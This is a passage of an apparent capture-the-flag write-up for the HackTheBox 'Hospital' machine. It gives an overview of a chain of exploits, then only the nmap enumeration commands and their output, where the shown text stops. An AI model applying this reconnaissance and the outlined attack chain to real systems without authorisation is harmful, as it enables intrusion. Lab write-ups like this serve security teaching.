<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-writeups docs-version-current docs-doc-page docs-doc-id-HackTheBox/hospital" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.9.1">
<title data-rh="true">Hospital | xffsec</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://xffsec.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://xffsec.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://xffsec.github.io/writeups/HackTheBox/hospital"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-writeups-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-writeups-current"><meta data-rh="true" property="og:title" content="Hospital | xffsec"><meta data-rh="true" name="description" content="Hospital is a medium-level challenge on HackTheBox, that covers a diverse range of exploitation techniques. Beginning with the discovery of a file upload vulnerability, leading to the exploitation of a privilege escalation flaw on a Linux server using &#x27;unshare&#x27; [CVE-2023-2640 &amp; CVE-2023-32629 GameOver(lay)]. Continuing with the creation of a malicious EPS file to exploit a command injection vulnerability in Ghostscript to get access to a Windows machine[CVE-2023-36664]. Additionally, finding various paths for achieving administrative access, such as exploiting misconfigurations in XAMPP by uploading an administrative webshell, and uncovering plaintext credentials via RDP."><meta data-rh="true" property="og:description" content="Hospital is a medium-level challenge on HackTheBox, that covers a diverse range of exploitation techniques. Beginning with the discovery of a file upload vulnerability, leading to the exploitation of a privilege escalation flaw on a Linux server using &#x27;unshare&#x27; [CVE-2023-2640 &amp; CVE-2023-32629 GameOver(lay)]. Continuing with the creation of a malicious EPS file to exploit a command injection vulnerability in Ghostscript to get access to a Windows machine[CVE-2023-36664]. Additionally, finding various paths for achieving administrative access, such as exploiting misconfigurations in XAMPP by uploading an administrative webshell, and uncovering plaintext credentials via RDP."><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://xffsec.github.io/writeups/HackTheBox/hospital"><link data-rh="true" rel="alternate" href="https://xffsec.github.io/writeups/HackTheBox/hospital" hreflang="en"><link data-rh="true" rel="alternate" href="https://xffsec.github.io/writeups/HackTheBox/hospital" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"📦 Hackthebox","item":"https://xffsec.github.io/writeups/category/-hackthebox-4"},{"@type":"ListItem","position":2,"name":"Hospital","item":"https://xffsec.github.io/writeups/HackTheBox/hospital"}]}</script><link rel="alternate" type="application/rss+xml" href="/research/rss.xml" title="xffsec RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/research/atom.xml" title="xffsec Atom Feed"><link rel="stylesheet" href="/assets/css/styles.79a61393.css">
<script src="/assets/js/runtime~main.ab8dc2c6.js" defer="defer"></script>
<script src="/assets/js/main.14d53dc0.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||"dark"),document.documentElement.setAttribute("data-theme-choice",t||"dark")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><b class="navbar__title text--truncate">XFF</b></a><a class="navbar__item navbar__link" href="/writeups">📚 Writeups</a><a class="navbar__item navbar__link" href="/tutorials">🗺️ Tutorials</a><a class="navbar__item navbar__link" href="/defensive-security">🛡️ Defensive Security</a><a class="navbar__item navbar__link" href="/offensive-security">⚔️ Offensive Security</a><a class="navbar__item navbar__link" href="/research">🤖 R&amp;D</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a href="https://github.com/xffsec" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><div class="navbar__search searchBarContainer_NW3z" dir="ltr"><input placeholder="Search" aria-label="Search" class="navbar__search-input searchInput_YFbd" value=""><div class="loadingRing_RJI3 searchBarLoadingRing_YnHq"><div></div><div></div><div></div><div></div></div></div></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/writeups"><span title="📚 Writeups" class="linkLabel_WmDU">📚 Writeups</span></a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" href="/writeups/category/-dockerlabs-4"><span title="🐋 Dockerlabs" class="categoryLinkLabel_W154">🐋 Dockerlabs</span></a><button aria-label="Expand sidebar category &#x27;🐋 Dockerlabs&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--active" href="/writeups/category/-hackthebox-4"><span title="📦 Hackthebox" class="categoryLinkLabel_W154">📦 Hackthebox</span></a><button aria-label="Collapse sidebar category &#x27;📦 Hackthebox&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/HackTheBox/bastard"><span title="Bastard" class="linkLabel_WmDU">Bastard</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/HackTheBox/blue"><span title="Blue" class="linkLabel_WmDU">Blue</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/HackTheBox/buff"><span title="Buff" class="linkLabel_WmDU">Buff</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/HackTheBox/charon"><span title="Charon" class="linkLabel_WmDU">Charon</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/HackTheBox/forest"><span title="Forest" class="linkLabel_WmDU">Forest</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/writeups/HackTheBox/hospital"><span title="Hospital" class="linkLabel_WmDU">Hospital</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/HackTheBox/reddish"><span title="Reddish" class="linkLabel_WmDU">Reddish</span></a></li></ul></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/writeups/category/-hackthebox-4"><span>📦 Hackthebox</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">Hospital</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Hospital</h1></header>
<p>Hospital is a medium-level challenge on HackTheBox, that covers a diverse range of exploitation techniques. Beginning with the discovery of a file upload vulnerability, leading to the exploitation of a privilege escalation flaw on a Linux server using &#x27;unshare&#x27; [CVE-2023-2640 &amp; CVE-2023-32629 GameOver(lay)]. Continuing with the creation of a malicious EPS file to exploit a command injection vulnerability in Ghostscript to get access to a Windows machine[CVE-2023-36664]. Additionally, finding various paths for achieving administrative access, such as exploiting misconfigurations in XAMPP by uploading an administrative webshell, and uncovering plaintext credentials via RDP.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="enumeration">Enumeration<a href="#enumeration" class="hash-link" aria-label="Direct link to Enumeration" title="Direct link to Enumeration" translate="no">​</a></h2>
<p>Beginning with an initial Nmap scan targeting all ports using TCP  SYN scan at a rate of minimum 5000 packets per second. The scan results are saved to a file named &#x27;allPorts&#x27; in &#x27;grep&#x27; format, facilitating the extraction of discovered ports. Afterwards, an exhaustive scan is conducted on each identified port using a more direct approach</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">sudo nmap -sS -p- --open -n -Pn --min-rate=5000 10.10.11.241 -oG allPorts -vvv</span><br></span></code></pre></div></div>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">PORT     STATE SERVICE          REASON</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">22/tcp   open  ssh              syn-ack ttl 62</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">53/tcp   open  domain           syn-ack ttl 127</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">88/tcp   open  kerberos-sec     syn-ack ttl 127</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">135/tcp  open  msrpc            syn-ack ttl 127</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">139/tcp  open  netbios-ssn      syn-ack ttl 127</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">389/tcp  open  ldap             syn-ack ttl 127</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">443/tcp  open  https            syn-ack ttl 127</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">445/tcp  open  microsoft-ds     syn-ack ttl 127</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">464/tcp  open  kpasswd5         syn-ack ttl 127</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">593/tcp  open  http-rpc-epmap   syn-ack ttl 127</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">636/tcp  open  ldapssl          syn-ack ttl 127</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">1801/tcp open  msmq             syn-ack ttl 127</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2103/tcp open  zephyr-clt       syn-ack ttl 127</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2105/tcp open  eklogin          syn-ack ttl 127</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2107/tcp open  msmq-mgmt        syn-ack ttl 127</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2179/tcp open  vmrdp            syn-ack ttl 127</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">3268/tcp open  globalcatLDAP    syn-ack ttl 127</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">3269/tcp open  globalcatLDAPssl syn-ack ttl 127</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">3389/tcp open  ms-wbt-server    syn-ack ttl 127</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">5985/tcp open  wsman            syn-ack ttl 127</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">6404/tcp open  boe-filesvr      syn-ack ttl 127</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">6406/tcp open  boe-processsvr   syn-ack ttl 127</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">6407/tcp open  boe-resssvr1     syn-ack ttl 127</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">6409/tcp open  boe-resssvr3     syn-ack ttl 127</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">6615/tcp open  unknown          syn-ack ttl 127</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">6631/tcp open  unknown          syn-ack ttl 127</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">6643/tcp open  unknown          syn-ack ttl 127</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">8080/tcp open  http-proxy       syn-ack ttl 62</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">9389/tcp open  adws             syn-ack ttl 127</span><br></span></code></pre></div></div>
<p>An exhaustive Nmap scan is conducted on the identified ports to determine their respective versions and to search for potential exploit scripts. This approach optimizes resource usage by first identifying the open ports extracted from the previously saved &#x27;grep&#x27; format file before initiating targeted scans for version detection and exploit potential.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">sudo nmap -sVC -p22,53,88,135,139,389,443,445,464,593,636,1801,2103,2105,2107,2179,3268,3269,3389,5985,6404,6406,6407,6409,6615,6631,6643,8080,9389 --min-rate=5000 -n -Pn 10.10.11.241 -oN targeted</span><br></span></code></pre></div></div>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">PORT     STATE SERVICE           VERSION</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| ssh-hostkey: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">53/tcp   open  domain            Simple DNS Plus</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-04-26 10:09:27Z)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">135/tcp  open  msrpc             Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| ssl-cert: Subject: commonName=DC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Not valid before: 2023-09-06T10:49:03</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_Not valid after:  2028-09-06T10:49:03</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_ssl-date: TLS randomness does not represent time</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| ssl-cert: Subject: commonName=localhost</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Not valid before: 2009-11-10T23:48:47</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_Not valid after:  2019-11-08T23:48:47</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| tls-alpn: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  http/1.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-title: Hospital Webmail :: Welcome to Hospital Webmail</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">445/tcp  open  microsoft-ds?</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">464/tcp  open  kpasswd5?</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">636/tcp  open  ldapssl?</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| ssl-cert: Subject: commonName=DC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Not valid before: 2023-09-06T10:49:03</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_Not valid after:  2028-09-06T10:49:03</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">1801/tcp open  msmq?</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2103/tcp open  msrpc             Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2105/tcp open  msrpc             Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2107/tcp open  msrpc             Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2179/tcp open  vmrdp?</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| ssl-cert: Subject: commonName=DC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Not valid before: 2023-09-06T10:49:03</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_Not valid after:  2028-09-06T10:49:03</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">3269/tcp open  globalcatLDAPssl?</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| ssl-cert: Subject: commonName=DC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Not valid before: 2023-09-06T10:49:03</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_Not valid after:  2028-09-06T10:49:03</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">3389/tcp open  ms-wbt-server     Microsoft Terminal Services</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| rdp-ntlm-info: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   Target_Name: HOSPITAL</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   NetBIOS_Domain_Name: HOSPITAL</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   NetBIOS_Computer_Name: DC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   DNS_Domain_Name: hospital.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   DNS_Computer_Name: DC.hospital.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   DNS_Tree_Name: hospital.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   Product_Version: 10.0.17763</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  System_Time: 2024-04-26T10:10:26+00:00</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| ssl-cert: Subject: commonName=DC.hospital.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Not valid before: 2024-04-25T10:03:13</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_Not valid after:  2024-10-25T10:03:13</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-title: Not Found</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">6404/tcp open  msrpc             Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">6406/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">6407/tcp open  msrpc             Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">6409/tcp open  msrpc             Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">6615/tcp open  msrpc             Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">6631/tcp open  msrpc             Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">6643/tcp open  msrpc             Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">8080/tcp open  http              Apache httpd 2.4.55 ((Ubuntu))</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| http-title: Login</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_Requested resource was login.php</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-server-header: Apache/2.4.55 (Ubuntu)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-open-proxy: Proxy might be redirecting requests</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| http-cookie-flags: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   /: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     PHPSESSID: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_      httponly flag not set</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">9389/tcp open  mc-nmf            .NET Message Framing</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Host script results:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_clock-skew: mean: 6h59m52s, deviation: 0s, median: 6h59m52s</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| smb2-security-mode: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   3:1:1: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_    Message signing enabled and required</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| smb2-time: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   date: 2024-04-26T10:10:26</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  start_date: N/A</span><br></span></code></pre></div></div>
